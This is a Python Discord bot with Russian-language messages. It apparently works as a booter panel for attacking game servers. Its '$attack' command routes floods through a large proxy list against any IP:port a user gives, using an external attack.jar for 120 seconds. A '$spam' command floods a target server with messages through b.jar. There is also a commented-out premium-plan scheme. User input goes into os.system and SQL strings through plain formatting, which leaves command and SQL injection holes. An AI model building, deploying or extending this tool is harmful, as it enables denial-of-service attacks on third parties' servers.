import hikari, os, items, threading, random, re, sqlite3

import urllib.request
import json as js

from proxy import Proxy as p

prefix = "$"

# Unix support
if os.name != "nt":
    import uvloop
    uvloop.install()

def is_command(cmd_name: str, content: str) -> bool:
    return content == f"{prefix}{cmd_name}"
#def spam_addon():
#    cmd = "python spam_addon.py"
#    os.system(cmd)
def attackthread(ip: str, protocol, method):
    #port = ip.split(":")[1]
    p.parse("./proxies.txt") # parses 65K proxies (random types)
    cmd = "java -Xmx2G -jar ./jars/attack.jar {} {} {} {} {}".format(ip, protocol, method, 120, "-1")
    os.system(cmd)

#con = sqlite3.connect('users.db')
#cur = con.cursor()
#def setup():
#    sql = """CREATE TABLE IF NOT EXISTS {} (
#        id INT,
#        type TEXT
#        );""".format("users")
#    cur.execute(sql)

#def check_if_premium(id) -> bool:
#    cur.execute("SELECT * FROM users WHERE id = {}".format(id))
#    data = cur.fetchall()
#    if len(data) == 0: return False
#    else: return True

def attackthread_spam(ip: str, time: int, message: str):
    cmd = "\".jdk\\bin\\java\" -Xmx2G -jar ./jars/b.jar {} {} \"{}\"".format(ip, time, message)
    os.system(cmd)
def randomcolor():
    return hikari.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

protocols = items.PROTOCOLS
menu = items.MENU

bot = hikari.GatewayBot(
    token = items.TOKEN,
    logs = {
        "version": 1,
        "incremental": True,
        "loggers": {
            "hikari.gateway": {"level": "DEBUG"},
            "hikari.ratelimits": {"level": "TRACE_HIKARI"},
        },
    },
)

#spm = threading.Thread(target=spam_addon)
#spm.setDaemon(True)
#spm.start()

# TODO make plans

#setup() # set-ups sqlite3

@bot.listen(hikari.MessageCreateEvent)
async def message(e: hikari.GuildMessageCreateEvent) -> None:
    try:
        args = e.content[1:].split()
    except TypeError:
        pass
    if not e.is_human or not e.content or not e.content.startswith(prefix):
        return
    if e.content.startswith(prefix):
        for arg in args:
            if is_command("resolve", e.content) and len(args) == 2:
                # resolve
                url = "https://api.mcsrvstat.us/2/" + args[1]
                file = urllib.request.urlopen(url)
                for line in file:
                    decoded = line.decode("utf-8")
                jse = js.loads(decoded)
                if "icon" in jse: status = "✅ Server online"
                else:
                    await e.message.respond("Сервер выключен или нельзя получить данные :(")
                    return
                # embed
                embed = hikari.Embed(title="Resolved", color = randomcolor())
                embed.add_field(name="IP:", value=jse["ip"], inline=True)
                embed.add_field(name="Port:", value=jse["port"], inline=True)
                embed.add_field(name="Hostname:", value=jse["hostname"], inline=True)
                embed.add_field(name="Status:", value=status, inline=False)
                await e.message.respond(embed=embed)
                return
            if is_command("resolve", e.content) and len(args) != 2:
                await e.message.respond(items.NOT_FOUND)
                return                        
            # Protocol command
            if is_command("protocols", e.content) and len(args) == 1:
                embed = hikari.Embed(title="📱 Версии : Протоколы", color = randomcolor())
                for version, protocol in protocols.items(): embed.add_field(name=version + ":", value=protocol, inline=True)
                await e.message.respond(embed=embed)
                return
            # help command
            if is_command("help", e.content) and len(args) == 1:
                embed = hikari.Embed(title="Menu", color = randomcolor())
                for cmd_name, cmd_desc in menu.items(): embed.add_field(name=cmd_name, value=cmd_desc)
                await e.message.respond(embed=embed)
                return
            if e.content.startswith("{}attack".format(prefix)) and len(args) == 4:
                if args[3] in str(items.METHOD_LIST): 
                    pass
                else:
                    embed = hikari.Embed(title=items.ERROR, description=items.METHOD_ERROR)
                    await e.message.respond(embed=embed)
                    return
                if args[2].isdigit(): pass
                else:
                    embed = hikari.Embed(title=items.ERROR, description=items.INTEGER_ERROR)
                    await e.message.respond(embed=embed)
                    return
                if bool(re.match(r"127.0.0.1:[0-9]+", args[1])):
                    embed = hikari.Embed(title=items.ERROR, description=items.BLACKLIST_ERROR)
                    await e.message.respond(embed=embed)
                    return
                if bool(re.match(r"0.0.0.0:[0-9]+", args[1])):
                    embed = hikari.Embed(title=items.ERROR, description=items.BLACKLIST_ERROR)
                    await e.message.respond(embed=embed)
                    return
                ip = re.compile(r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?):\d{1,5}\b")
                if ip.match(args[1]): pass
                else:
                    embed = hikari.Embed(title=items.ERROR, description=items.IP_ERROR)
                    await e.message.respond(embed=embed)
                    return
                embed = hikari.Embed(
                    title="🔺 Sent attack...", 
                    description="✅ Атака была запущена игроком {}".format(e.message.author.mention), 
                    color=randomcolor())
                embed.add_field(name="🖥 Хост:", value=args[1])
                embed.add_field(name="💎 Версия:", value=args[2])
                embed.add_field(name="📂 Метод:", value=args[3])
                embed.add_field(name="🕐 Время:", value="120 sec")
                # start attack (Using threading)
                atck = threading.Thread(target=attackthread, args=[args[1], args[2], args[3],])
                atck.setDaemon(True)
                atck.start()
                await e.message.respond(embed=embed)
                return
            if e.content.startswith("{}attack".format(prefix)) and len(args) != 4:
                embed = hikari.Embed(title=items.ERROR, description=items.NOT_FOUND, color = randomcolor())
                await e.message.respond(embed=embed)
                return
            if is_command("methods", e.content) and len(args) == 1:
                embed = hikari.Embed(title="📁 All Methods", color = randomcolor(), description=items.METHODS)
                await e.message.respond(embed=embed)
                return
            #if is_command("members", e.content):
            #    if e.message.author.id in items.OWNERS: pass
            #    else: return
            #    embed = hikari.Embed(title="📁 Users", color = randomcolor())
            #    try: 
            #        con.execute("SELECT * FROM users")
            #        for row in con:
            #            embed.add_field(name="✖️ User: {}".format(row[0]), value="💲Plan: {}".format(row[1]))
            #    except:
            #        embed.add_field(name="📁 User: Empty", value="No one have premium plan.")
            #    await e.message.respond(embed=embed)
            #    return
            if e.content == f"{prefix}latency" or f"{prefix}ping":
                if e.content == f"{prefix}ping": await e.message.respond(f"Pong! {bot.heartbeat_latency * 1_000:.0f}ms")
                if e.content == f"{prefix}latency": await e.message.respond(f"{bot.heartbeat_latency * 1_000:.0f}ms")   
            if e.content.startswith(f"{prefix}spam") and len(args) == 4:
                time = args[2]
                ip2 = args[1]
                text = args[3].replace(";", "")
                if time.isdigit(): pass
                else:
                    embed = hikari.Embed(title="❌ ERROR!", description=items.INTEGER_ERROR)
                    await e.message.respond(embed=embed)
                    return
                ip = re.compile(r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?):\d{1,5}\b")
                if ip.match(ip2): pass
                else:
                    embed = hikari.Embed(title="❌ ERROR!", description=items.IP_ERROR)
                    await e.message.respond(embed=embed)
                    return
                print(f"{ip2}\n{time}\n{text}")
                embed = hikari.Embed(title="✅ Атака успешно отправлена", color = randomcolor())
                embed.add_field(name="🖥 Server:", value=ip2, inline=False)
                embed.add_field(name="🕔 Time:", value=time, inline=False)
                embed.add_field(name="✍ Text:", value=text, inline=False)
                await e.message.respond(embed=embed)
                atck = threading.Thread(target=attackthread_spam, args=[ip2, time, text,])
                atck.setDaemon(True)
                atck.start()
                return
            #if is_command("premium", e.content) and len(args) == 3:
            #    if e.message.author.id in items.OWNERS: pass
            #    else: return
            #    if args[1] == "add":
            #        if args[2].isdigit():
            #            sql = "INSERT OR IGNORE INTO users(id, type) VALUES({}, \"{}\")".format(args[2], "premium")
            #            cur.execute(sql)
            #            con.commit()
            #            await e.message.respond("Добавил.")
            #            return
            #        else: return
            #    if args[1] == "remove":
            #        if args[2].isdigit():
            #            sql = "DELETE FROM users WHERE id = {}".format(args[2])
            #            cur.execute(sql)
            #            con.commit()
            #            await e.message.respond("Удалил.")
            #            return
            #        else: return
            #if e.content.startswith("{}plan".format(prefix)) and len(args) == 1:
            #    if check_if_premium(e.message.author.id): embed = hikari.Embed(title="📁User", description="Premium", color = randomcolor())
            #    else: embed = hikari.Embed(title="📁User", description="Free", color = randomcolor())
            #    await e.message.respond(embed=embed)
            #    return
                
bot.run(
    asyncio_debug=True,
    propagate_interrupts=True
)   